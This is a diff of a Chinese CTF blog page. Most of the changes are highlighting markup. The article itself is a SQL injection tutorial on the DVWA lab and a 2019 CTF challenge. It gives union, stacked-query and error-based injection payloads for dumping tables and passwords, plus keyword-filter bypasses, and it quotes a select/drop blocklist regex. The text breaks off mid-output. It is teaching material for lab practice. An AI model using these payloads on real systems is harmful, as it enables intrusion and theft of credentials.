@@ -102,12 +102,12 @@ Arashimuのblog = CTFer</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeyvx1d4j20zk0m8hdt.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giph4baakhj20zk0m8h5q.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclhpw3lwj20zk0m8gvw.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giciukx8a7j20zk0m8aio.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclffsa1cj20zk0m811l.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giph4lm9i7j20zk0m84qp.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclgi503lj20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipetfk5zwj20zk0m8e81.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipey0a334j20zk0m8qpt.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giph4wqtg4j20zk0m8x6p.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclfb3vzhj20zk0m8wny.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicljitigmj20zk0m87fp.jpg"></li>
         </ul>
       </div>
     </header>
@@ -151,27 +151,27 @@ Arashimuのblog = CTFer</title>
   <div class="body md" itemprop="articleBody">
     
 
-    <h1 id="sql注入dvwa"><a class="markdownIt-Anchor" href="#sql注入dvwa"></a> SQL注入(DVWA)</h1>
-<h2 id="1low-可以手工注入"><a class="markdownIt-Anchor" href="#1low-可以手工注入"></a> 1.Low (可以手工注入)</h2>
-<p>手工注入并且不是盲注(盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。)</p>
-<h3 id="mysql结构"><a class="markdownIt-Anchor" href="#mysql结构"></a> MYSQL结构</h3>
+    <h1 id="sql注入dvwa"><a class="markdownIt-Anchor" href="#sql注入dvwa">#</a> SQL 注入 (DVWA)</h1>
+<h2 id="1low-可以手工注入"><a class="markdownIt-Anchor" href="#1low-可以手工注入">#</a> 1.Low (可以手工注入)</h2>
+<p>手工注入并且不是盲注 (盲注就是在 sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显到前端页面。)</p>
+<h3 id="mysql结构"><a class="markdownIt-Anchor" href="#mysql结构">#</a> MYSQL 结构</h3>
 <p>一个数据库可以创建多个表，一张表含有多列。比如我有一个’客户’的数据库，这个数据库需要’用户信息’，‘用户消费记录’，‘用户反馈’等表，对于’用户信息’这张表来说，又需要’电话号码’，’年龄‘，’姓名‘等信息，这些信息单位作为每列的表头。</p>
-<h3 id="注入流程"><a class="markdownIt-Anchor" href="#注入流程"></a> 注入流程</h3>
+<h3 id="注入流程"><a class="markdownIt-Anchor" href="#注入流程">#</a> 注入流程</h3>
 <ul>
 <li>是否存在注入并且判断注入类型</li>
 <li>判断字段数：  order by</li>
-<li>确定回显位：union select 1,2(查询的信息在前端有回显，回显数据的位置就叫回显位。)</li>
+<li>确定回显位：union select 1,2 (查询的信息在前端有回显，回显数据的位置就叫回显位。)</li>
 <li>查询数据库信息：</li>
-<li>查询用户名，数据库名：user() database()</li>
+<li>查询用户名，数据库名：user () database ()</li>
 <li>文件读取</li>
-<li>写入webshell</li>
+<li>写入 webshell</li>
 </ul>
-<h3 id="闭合方式"><a class="markdownIt-Anchor" href="#闭合方式"></a> 闭合方式</h3>
-<pre class="highlight"><code class=""> where user_id = 1 or 1=1   //无引号闭合
+<h3 id="闭合方式"><a class="markdownIt-Anchor" href="#闭合方式">#</a> 闭合方式</h3>
+<pre><code> where user_id = 1 or 1=1   //无引号闭合
  where user_id = '1' or '1'='1' //单引号闭合
  where user_id =&quot; 1 &quot;or &quot;1&quot;=&quot;1&quot; //双引号闭合
 </code></pre>
-<h3 id="注入类型"><a class="markdownIt-Anchor" href="#注入类型"></a> 注入类型</h3>
+<h3 id="注入类型"><a class="markdownIt-Anchor" href="#注入类型">#</a> 注入类型</h3>
 <ul>
 <li>UNION query SQL injection（可联合查询注入)</li>
 <li>Stacked queries SQL injection（可多语句查询注入）堆叠查询</li>
@@ -181,96 +181,89 @@ Arashimuのblog = CTFer</title>
 <li>字符型注入</li>
 <li>数字型注入</li>
 </ul>
-<h4 id="1可联合查询注入"><a class="markdownIt-Anchor" href="#1可联合查询注入"></a> 1.可联合查询注入</h4>
+<h4 id="1可联合查询注入"><a class="markdownIt-Anchor" href="#1可联合查询注入">#</a> 1. 可联合查询注入</h4>
 <ul>
 <li>
-<p>条件：如果使用union查询，要先猜字段数量，因为通过union连接的两条SQL语句必须字段数列一样。最后面加上order by 2 得出到底有多少行（就是一直减少到前端出来东西为止）</p>
-<pre class="highlight"><code class="sql">xxx <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>
-#这里也要看看有多少<span class="hljs-keyword">select</span>出来的可以在前端看到，一直减少<span class="hljs-keyword">select</span>后面的数字知道前端刷新出东西，也就是确定回显位
-#然后可以把回显位的地方替换成<span class="hljs-keyword">user</span>()、database()、version()等查询查询命令在前端得到对应信息
-</code></pre>
-</li>
+<p>条件：如果使用 union 查询，要先猜字段数量，因为通过 union 连接的两条 SQL 语句必须字段数列一样。最后面加上 order by 2 得出到底有多少行（就是一直减少到前端出来东西为止）</p>
+<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>xxx <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#这里也要看看有多少 select 出来的可以在前端看到，一直减少 select 后面的数字知道前端刷新出东西，也就是确定回显位</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#然后可以把回显位的地方替换成 user ()、database ()、version () 等查询查询命令在前端得到对应信息</span></pre></td></tr></table></figure></li>
 <li>
 <p>步骤：判断完回显点之后</p>
 <ul>
 <li>
 <p>查数据库名：</p>
-<pre class="highlight"><code class="sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,database()#
-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>(),database()#
-</code></pre>
-</li>
+<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">1</span><span class="token string">' union select 1,database()#</pre></td></tr><tr><td data-num="2"></td><td><pre>1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span></pre></td></tr></table></figure></li>
 <li>
 <p>查表名</p>
-<pre class="highlight"><code class="">xxx union select 1,2,3,4,TABLE_NAME,6,7,8 from information_schema.TABLES where TABLE_SCHEMA='数据库名' limit 1,1
+<pre><code>xxx union select 1,2,3,4,TABLE_NAME,6,7,8 from information_schema.TABLES where TABLE_SCHEMA='数据库名' limit 1,1
 </code></pre>
-<p><strong>information_schema.TABLES</strong> 是MySQL自带的，它提供了访问数据库元数据的方式。什么是元数据呢?元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。<br />
-因为前端显示的限制，所以要<strong>limit</strong>，<strong>limit 1,1则代表从第一条起，只显示一条</strong></p>
-<p>但也可以利用函数将查询结果凭借<strong>concat()、group_concat</strong>函数来，这两个函数我们可以简单认为是连接字符串，比如group_concat(user(),database(),version())就是把这三个常量的注入结果连接在一起，当做一个整体字符串显示在注入结果中</p>
-<pre class="highlight"><code class="">1' union select 1,group_concat(table_name) from information_schema.tables where table_schema =database()#
+<p><strong>information_schema.TABLES</strong> 是 MySQL 自带的，它提供了访问数据库元数据的方式。什么是元数据呢？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。<br>
+因为前端显示的限制，所以要<strong> limit</strong>，<strong>limit 1,1 则代表从第一条起，只显示一条</strong></p>
+<p>但也可以利用函数将查询结果凭借<strong> concat ()、group_concat</strong> 函数来，这两个函数我们可以简单认为是连接字符串，比如 group_concat (user (),database (),version ()) 就是把这三个常量的注入结果连接在一起，当做一个整体字符串显示在注入结果中</p>
+<pre><code>1' union select 1,group_concat(table_name) from information_schema.tables where table_schema =database()#
 </code></pre>
 </li>
 <li>
 <p>查列名</p>
-<p>利用<strong>information_schema.columns</strong>查列名，后面的<strong>table_name</strong>跟上一步查出的表名</p>
-<pre class="highlight"><code class="">1' union select 1,group_concat(column_name) from information_schema.columns where table_name ='users'#
+<p>利用<strong> information_schema.columns</strong> 查列名，后面的<strong> table_name</strong> 跟上一步查出的表名</p>
+<pre><code>1' union select 1,group_concat(column_name) from information_schema.columns where table_name ='users'#
 </code></pre>
 </li>
 <li>
 <p>查用户数据</p>
 <p>利用上一步的到的列名进一步查询用户信息</p>
-<pre class="highlight"><code class="">1' or 1=1 union select group_concat(列名1，列名2，列名3),group_concat(password) from 表名 #
+<pre><code>1' or 1=1 union select group_concat(列名1，列名2，列名3),group_concat(password) from 表名 #
 1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #
 1' union select null,group_concat(concat_ws(char(32,58,32),user,password)) from users #  
 </code></pre>
 </li>
 <li>
-<p>最后的到数据可能会被编码，比如 MD5,SM6等，注意解码。</p>
+<p>最后的到数据可能会被编码，比如 MD5,SM6 等，注意解码。</p>
 </li>
 </ul>
-<h4 id="2堆叠查询"><a class="markdownIt-Anchor" href="#2堆叠查询"></a> 2.堆叠查询</h4>
+<h4 id="2堆叠查询"><a class="markdownIt-Anchor" href="#2堆叠查询">#</a> 2. 堆叠查询</h4>
 <ul>
 <li>
-<p>原理：数据库中’;‘表示一个语句的结束，如果没有对’;‘过滤，可以同时构造多条不同的语句，区别于联合查询注入的是联合查询只能执行查询语句，而堆叠查询可以执行任意语句，每条语句用’;'隔开即可。</p>
+<p>原理：数据库中’;‘表示一个语句的结束，如果没有对’;‘过滤，可以同时构造多条不同的语句，区别于联合查询注入的是联合查询只能执行查询语句，而堆叠查询可以执行任意语句，每条语句用’;' 隔开即可。</p>
 </li>
 <li>
 <p>步骤</p>
 <ul>
 <li>
 <p>查数据库名</p>
-<pre class="highlight"><code class="">1'; show databases;#
+<pre><code>1'; show databases;#
 </code></pre>
 </li>
 <li>
 <p>查表名</p>
-<pre class="highlight"><code class="">1'; show tables from '数据库名';#  
+<pre><code>1'; show tables from '数据库名';#  
 </code></pre>
 </li>
 <li>
 <p>查列名</p>
-<pre class="highlight"><code class="">1'; show columns from `表名`;#
+<pre><code>1'; show columns from `表名`;#
 注意如果是以纯数字作为表名或列名，要用~下面`引起来
 </code></pre>
 </li>
 <li>
 <p>查完列名后查看相关信息，有些题目可能会用正则匹配阻止注入，比如</p>
-<pre class="highlight"><code class=""> preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);
+<pre><code> preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);
 </code></pre>
-<p>这时候想要直接查询是很难的。于是可以考虑使用<strong>预编译绕过</strong>或者用<strong>handler</strong>语句绕过</p>
+<p>这时候想要直接查询是很难的。于是可以考虑使用<strong>预编译绕过</strong>或者用<strong> handler</strong> 语句绕过</p>
 <ul>
 <li>
-<p>预编译：预编译语句就是将这类语句中的<strong>值用占位符替代</strong>，可以视为将<strong>sql语句模板化或者说参数化</strong>。一次编译、多次运行，省去了解析优化等过程。</p>
+<p>预编译：预编译语句就是将这类语句中的<strong>值用占位符替代</strong>，可以视为将<strong> sql 语句模板化或者说参数化</strong>。一次编译、多次运行，省去了解析优化等过程。</p>
 </li>
 <li>
 <p>基本操作</p>
-<pre class="highlight"><code class="">1';set @自定义变量=concat('s','elect * from '列名'');prepare 自定义模板名 from @自定义变量名;execute 自定义模板名;#
+<pre><code>1';set @自定义变量=concat('s','elect * from '列名'');prepare 自定义模板名 from @自定义变量名;execute 自定义模板名;#
 </code></pre>
 </li>
 <li>
-<p>handler：mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。<strong>它是mysql专用的语句</strong>，并没有包含到SQL标准中。</p>
+<p>handler：mysql 除可使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过 handler 语句并不具备 select 语句的所有功能。<strong>它是 mysql 专用的语句</strong>，并没有包含到 SQL 标准中。</p>
 </li>
 <li>
 <p>基本语法</p>
-<pre class="highlight"><code class="">HANDLER tbl_name OPEN;
+<pre><code>HANDLER tbl_name OPEN;
 HANDLER tbl_name READ index_name;
 因此可以尝试专业这样绕过select:
 1';handler tab_name open;handler tab_name read first/second/..;#
@@ -278,27 +271,23 @@ HANDLER tbl_name READ index_name;
 </li>
 <li>
 <p>还有可能继续阻止注入，比如</p>
-<pre class="highlight"><code class="sql">strstr($inject, &quot;set&quot;) <span class="hljs-operator">&amp;&amp;</span> strstr($inject, &quot;prepare&quot;)
-</code></pre>
-</li>
+<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>strstr<span class="token punctuation">(</span>$inject<span class="token punctuation">,</span> <span class="token string">"set"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> strstr<span class="token punctuation">(</span>$inject<span class="token punctuation">,</span> <span class="token string">"prepare"</span><span class="token punctuation">)</span></pre></td></tr></table></figure></li>
 </ul>
 </li>
 <li>
 <p>遇到当前输入框所查询的表不是目标表的时候，还存在正则匹配阻止注入，可以尝试改变表名来查询</p>
-<pre class="highlight"><code class="sql">rename <span class="hljs-keyword">table</span> `old_name` <span class="hljs-keyword">to</span> new_name;
-</code></pre>
-</li>
+<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">rename</span> <span class="token keyword">table</span> <span class="token identifier"><span class="token punctuation">`</span>old_name<span class="token punctuation">`</span></span> <span class="token keyword">to</span> new_name<span class="token punctuation">;</span></pre></td></tr></table></figure></li>
 </ul>
 </li>
 </ul>
 </li>
 </ul>
-<h3 id="3关键词被过滤的替代方法"><a class="markdownIt-Anchor" href="#3关键词被过滤的替代方法"></a> 3.关键词被过滤的替代方法</h3>
+<h3 id="3关键词被过滤的替代方法"><a class="markdownIt-Anchor" href="#3关键词被过滤的替代方法">#</a> 3. 关键词被过滤的替代方法</h3>
 <ul>
 <li>
 <p>双写绕过</p>
-<p>双写绕过的原理是后台利用正则匹配到敏感词将其替换为空。即如果过滤了<code>select</code>，我们输入<code>123select456</code> 后会被检测出敏感词，最后替换得到的字符串由<code>123select456</code> —&gt; <code>123456</code></p>
-<pre class="highlight"><code class="">1' ununionion seselectlect 1#
+<p>双写绕过的原理是后台利用正则匹配到敏感词将其替换为空。即如果过滤了 <code>select</code> ，我们输入 <code>123select456</code>  后会被检测出敏感词，最后替换得到的字符串由 <code>123select456</code>  —&gt;  <code>123456</code></p>
+<pre><code>1' ununionion seselectlect 1#
 </code></pre>
 </li>
 <li>
@@ -307,7 +296,7 @@ HANDLER tbl_name READ index_name;
 <li>
 <p>空格过滤</p>
 <p>如果遇到空格被过滤了，主要的几个思路都是想办法找一个代替品，能代替空格的有几个：</p>
-<pre class="highlight"><code class="">注释绕过  /**/ :正常情况下只要这个没有被过滤就一定能代替。
+<pre><code>注释绕过  /**/ :正常情况下只要这个没有被过滤就一定能代替。
 括号过滤 () ：将所有的关键字都用括号括起来就可以达到替代空格分隔的作用如下，
 正常：select * from user
 括号：(select)*(from)(user)
@@ -318,49 +307,25 @@ Tab替代：Tab可以做分隔功能。
 </li>
 <li>
 <p>注释过滤</p>
-<pre class="highlight"><code class="">#、;%00、-- (两个减号一个空格)
+<pre><code>#、;%00、-- (两个减号一个空格)
 </code></pre>
 </li>
 </ul>
-<h3 id="4报错注入"><a class="markdownIt-Anchor" href="#4报错注入"></a> 4.报错注入</h3>
+<h3 id="4报错注入"><a class="markdownIt-Anchor" href="#4报错注入">#</a> 4. 报错注入</h3>
 <ul>
 <li>
-<p>XPath报错注入</p>
+<p>XPath 报错注入</p>
 <ul>
 <li>
-<p>XPath使用路径表达式来选取 XML 文档中的节点或节点集。节点是通过沿着路径 (path) 或者步 (steps) 来选取的。</p>
+<p>XPath 使用路径表达式来选取 XML 文档中的节点或节点集。节点是通过沿着路径 (path) 或者步 (steps) 来选取的。</p>
 </li>
 <li>
 <p>常用的路径表达式</p>
-<pre class="highlight"><code class="xml">nodename(一个结点的名字)：选取此节点的所有子节点
-/                      ：从根节点选取
-//                     ：从匹配选择的当前节点选择文档中的节点，而不考虑位置
-.                      ：选取当前节点
-..                     ：选取当前节点的父节点
-@                      ：选取属性
-*                      ：可以匹配任何元素
-</code></pre>
-</li>
+<figure class="highlight xml"><figcaption data-lang="XML"></figcaption><table><tr><td data-num="1"></td><td><pre>nodename(一个结点的名字)：选取此节点的所有子节点</pre></td></tr><tr><td data-num="2"></td><td><pre>/                      ：从根节点选取</pre></td></tr><tr><td data-num="3"></td><td><pre>//                     ：从匹配选择的当前节点选择文档中的节点，而不考虑位置</pre></td></tr><tr><td data-num="4"></td><td><pre>.                      ：选取当前节点</pre></td></tr><tr><td data-num="5"></td><td><pre>..                     ：选取当前节点的父节点</pre></td></tr><tr><td data-num="6"></td><td><pre>@                      ：选取属性</pre></td></tr><tr><td data-num="7"></td><td><pre>*                      ：可以匹配任何元素</pre></td></tr></table></figure></li>
 <li>
 <p>具体应用</p>
-<pre class="highlight"><code class="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;ISO-8859-1&quot;</span>?&gt;</span>
-<span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>
-    <span class="hljs-tag">&lt;<span class="hljs-name">son</span>&gt;</span>
-        <span class="hljs-tag">&lt;<span class="hljs-name">name</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;s1&quot;</span>&gt;</span>s1<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
-        <span class="hljs-tag">&lt;<span class="hljs-name">weight</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">weight</span>&gt;</span>
-        <span class="hljs-tag">&lt;<span class="hljs-name">son</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">son</span>&gt;</span>
-    <span class="hljs-tag">&lt;/<span class="hljs-name">son</span>&gt;</span>
-    <span class="hljs-tag">&lt;<span class="hljs-name">son</span>&gt;</span>
-        <span class="hljs-tag">&lt;<span class="hljs-name">name</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;s2&quot;</span>&gt;</span>s2<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
-        <span class="hljs-tag">&lt;<span class="hljs-name">weight</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">weight</span>&gt;</span>
-        <span class="hljs-tag">&lt;<span class="hljs-name">son</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">son</span>&gt;</span>
-    &lt;/son?&gt;
-<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>
-
-
-</code></pre>
-<p>具体语法表示</p>
-<pre class="highlight"><code class="xaml">root            ：选取root元素的所有子节点，即两个son元素
+<figure class="highlight xml"><figcaption data-lang="XML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token prolog">&lt;?xml version="1.0" encoding="ISO-8859-1"?></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>son</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>s1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>s1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>weight</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>weight</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>son</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>son</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>son</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>son</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>s2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>s2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>weight</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>weight</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>son</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>son</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>son?</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p>具体语法表示</p>
+<pre><code class="language-xaml">root            ：选取root元素的所有子节点，即两个son元素
 /root           ：选取根元素root
 root/son        ：选取属于root的子元素的所有son元素，root下面的son，son下面的son不算
 //son           ：选取所有son子元素，不管它们在文档中的位置，root下的son和son里面的son
@@ -369,126 +334,62 @@ root//son       ：选取root元素的后代的所有son元素，不管它们在
 </code></pre>
 </li>
 <li>
-<p>在Sql报错注入中的应用</p>
+<p>在 Sql 报错注入中的应用</p>
 <ul>
 <li>
-<p><code>extractvalue('目标xml文件名','在xml中查询的字符串')</code>：对XML文档进行查询的函数</p>
-<p>第二个参数要求的是Xpath格式的字符串，语法正确是会按照路径 <code>/该xml文件/要查询的字符串</code> 进行查询 ，如果我们输入的<code>Xpath_string</code>不对就会报错，一般这个参数会填入我们想知道的数据库的信息，通过报错来获得，一般数据会在url中回显</p>
+<p><code>extractvalue('目标xml文件名','在xml中查询的字符串')</code> ：对 XML 文档进行查询的函数</p>
+<p>第二个参数要求的是 Xpath 格式的字符串，语法正确是会按照路径  <code>/该xml文件/要查询的字符串</code>  进行查询 ，如果我们输入的 <code>Xpath_string</code>  不对就会报错，一般这个参数会填入我们想知道的数据库的信息，通过报错来获得，一般数据会在 url 中回显</p>
 </li>
 <li>
 <p><code>updatexml('目标xml文件名','在xml中查询的字符串','替换后的值')</code></p>
-<p>第一、三个参数随便填，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式函数利用，否则报错，利用和上面的一样</p>
+<p>第一、三个参数随便填，只需要利用第二个参数，他会校验你输入的内容是否符合 XPATH 格式函数利用，否则报错，利用和上面的一样</p>
 </li>
 <li>
 <p>两处利用的参数形式</p>
-<p>一般是<code>concat(0x7e,sql命令,0x7e)</code>来填充，选用<code>0x7e</code>是<code>~</code>符号，是为了让xml的全部数据都校验失效，还可以用<code>'#'</code>或<code>0x4e24</code></p>
+<p>一般是 <code>concat(0x7e,sql命令,0x7e)</code>  来填充，选用 <code>0x7e</code>  是 <code>~</code>  符号，是为了让 xml 的全部数据都校验失效，还可以用 <code>'#'</code>  或 <code>0x4e24</code></p>
 </li>
 </ul>
 </li>
 </ul>
 </li>
 </ul>
-<h3 id="5例题"><a class="markdownIt-Anchor" href="#5例题"></a> 5.例题</h3>
-<h4 id="1强网杯-2019随便注"><a class="markdownIt-Anchor" href="#1强网杯-2019随便注"></a> 1.[强网杯 2019]随便注</h4>
+<h3 id="5例题"><a class="markdownIt-Anchor" href="#5例题">#</a> 5. 例题</h3>
+<h4 id="1强网杯-2019随便注"><a class="markdownIt-Anchor" href="#1强网杯-2019随便注">#</a> 1.[强网杯 2019] 随便注</h4>
 <ul>
 <li>
 <p>首先尝试判断回显</p>
-<pre class="highlight"><code class="">1' union select 1,2
+<pre><code>1' union select 1,2
 </code></pre>
 <p>但是出现了这样的错误信息</p>
-<pre class="highlight"><code class="">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);
+<pre><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);
 </code></pre>
-<p>说明通过了正则匹配来防止注入，<code>select</code>和<code>where</code>不能用了，所以考虑堆叠注入</p>
+<p>说明通过了正则匹配来防止注入， <code>select</code>  和 <code>where</code>  不能用了，所以考虑堆叠注入</p>
 </li>
 <li>
 <p>先看一下能不能用万能密码和闭合方式</p>
-<pre class="highlight"><code class="">1' or 1=1 #
+<pre><code>1' or 1=1 #
 </code></pre>
 <p>返回了类似数据库的内容</p>
 </li>
 <li>
 <p>查看表名</p>
-<pre class="highlight"><code class="">1';show tables#
+<pre><code>1';show tables#
 </code></pre>
 <p>返回的数据如下</p>
-<pre class="highlight"><code class="php"><span class="hljs-keyword">array</span>(<span class="hljs-number">2</span>) &#123;
-  [<span class="hljs-number">0</span>]=&gt;
-  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span>
-  [<span class="hljs-number">1</span>]=&gt;
-  <span class="hljs-keyword">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;hahahah&quot;</span>
-&#125;
------------------------------------------------------------------------------------------------
-<span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;
-  [<span class="hljs-number">0</span>]=&gt;
-  <span class="hljs-keyword">string</span>(<span class="hljs-number">16</span>) <span class="hljs-string">&quot;1919810931114514&quot;</span>
-&#125;
-
-<span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;
-  [<span class="hljs-number">0</span>]=&gt;
-  <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;words&quot;</span>
-&#125;
-
-</code></pre>
-<p>说明有两个表，分别是<code>words</code>和<code>1919810931114514</code></p>
+<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"1"</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=></span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"hahahah"</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token 